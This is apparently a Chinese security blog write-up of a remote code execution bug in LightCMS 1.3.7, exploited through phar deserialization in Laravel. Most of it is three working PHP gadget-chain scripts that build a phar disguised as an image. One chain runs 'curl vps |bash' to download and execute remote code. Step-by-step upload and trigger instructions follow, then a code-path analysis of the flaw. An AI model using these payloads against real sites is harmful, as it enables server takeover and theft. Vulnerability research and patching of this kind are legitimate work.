# 原创
：  LightCMS1.3.7-RCE漏洞

# LightCMS1.3.7-RCE漏洞

#### LightCMS1.3.7-RCE漏洞

## 环境搭建(Kali)

> 
参考之间的文章：[LightCMS1.3.5-任意文件读取&amp;RCE漏洞](https://blog.csdn.net/LYJ20010728/article/details/117755107?spm=1001.2014.3001.5502)


## 漏洞复现

> 
找一个 Laravel RCE 的 gadget，生成 phar 文件，exp如下


```
POP_1

&lt;?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        }

    }

    class BroadcastEvent
    {
        protected $connection;

        public function __construct($connection)
        {
            $this-&gt;connection = $connection;
        }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
            $this-&gt;queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent('whoami');

    $dispater = new Illuminate\Bus\Dispatcher("system");

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
    $phar = new Phar('phar.phar');
    $phar -&gt; stopBuffering();
    $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;");
    $phar -&gt; addFromString('test.txt','test');
    $phar -&gt; setMetadata($PendingBroadcast);
    $phar -&gt; stopBuffering();
    rename('phar.phar','phar.jpg');
}

```

```
POP_2

&lt;?php
namespace Illuminate\Broadcasting
{
    use  Illuminate\Events\Dispatcher;
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this-&gt;events = new Dispatcher($cmd);
            $this-&gt;event=$cmd;
        }
    }

}


namespace Illuminate\Events
{
    class Dispatcher
    {
       protected $listeners;
       public function __construct($event){
           $this-&gt;listeners=[$event=&gt;['system']];
       }
    }
}
namespace{
    $phar = new Phar('phar.phar');
    $phar -&gt; startBuffering();
    $phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');
    $o = new Illuminate\Broadcasting\PendingBroadcast($argv[1]);
    echo base64_encode(serialize($o));
    $phar -&gt; setMetadata($o);
    $phar -&gt; addFromString('test.txt','test');
$phar -&gt; stopBuffering();
}

```

```
POP_3

&lt;?php

namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this-&gt;events = $events;
            $this-&gt;event = $event;
        }

    }

    class BroadcastEvent
    {
      protected $connection;

      public function __construct($connection)
      {
        $this-&gt;connection = $connection;
      }
    }

}

namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;

        public function __construct($queueResolver)
        {
          $this-&gt;queueResolver = $queueResolver;
        }

    }
}

namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent('curl vps |bash');

    $dispater = new Illuminate\Bus\Dispatcher("system");

    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
    $phar = new Phar('phar.phar');
    $phar -&gt; stopBuffering();
    $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); 
    $phar -&gt; addFromString('test.txt','test');
    $phar -&gt; setMetadata($PendingBroadcast);
    $phar -&gt; stopBuffering();
    rename('phar.phar','phar.jpg');

}

```

> 
来到内容管理 - 新增文章内容，上传文件，就会得到一个这样的图片 url：`http://127.0.0.1:8000/upload/image/202106/qYUkjTWuFUMdMKo2hhp4DptwF23FkZJZ2nM1ixWy.gif`


> 
然后来到我们自己的 vps，新建一个 txt，内容为：`phar://./upload/image/202106/qYUkjTWuFUMdMKo2hhp4DptwF23FkZJZ2nM1ixWy.gif`


> 
然后 POST 提交到这个路由即可触发 phar 反序列化


## 漏洞分析

> 
在LightCMS1.3.5的任意文件读取漏洞被提出并且修复后，我们来分析一下作者修复所用的`fetchImageFile`函数


> 
跟进`fetchImageFile`函数，可以看到其使用curl来获取远程资源的内容，然后使用 Image:make 模块进行解析，并且对后缀也进行了严格的过滤，由于该后台是基于laravel框架开发，并且这个cms 后台还是有图片上传功能的，不妨我们尝试利用`phar反序列化实现RCE`


> 
我们跟进一下`isWebp函数` ，由于传入的不是Webp文件，所以会进入`Image::make($data);`，而且这个data变量也就是请求返回的内容，在获取到远程url的内容后，会调用`Intervention\Image\Facades\Image`的 make方法，对图片内容进行解析


> 
继续跟进到`vendor/intervention/image/src/intervention/Image/AbstractDriver.php`，通过 `init()`，然后传入 `decoder-&gt;init()`


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210610110502786.png#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210610110508504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
可以看到 data 不仅可以是图片的二进制数据 ，还可以是这些数据格式，跟进 `initFromUrl`方法


> 
它继续读取了这个 url 的内容，然后作为 binary 数据处理


> 
跟进 `isUrl`，这个方法只是利用 FILTER VAR 判断是否为 url，这意味着前面的 http 协议可以替换成其他协议，比如 phar 协议，将 url 内容改成一个 phar 进行测试，依旧进到了这里并且传给了 file_get_contents()，即可以触发 `phar 反序列化`了

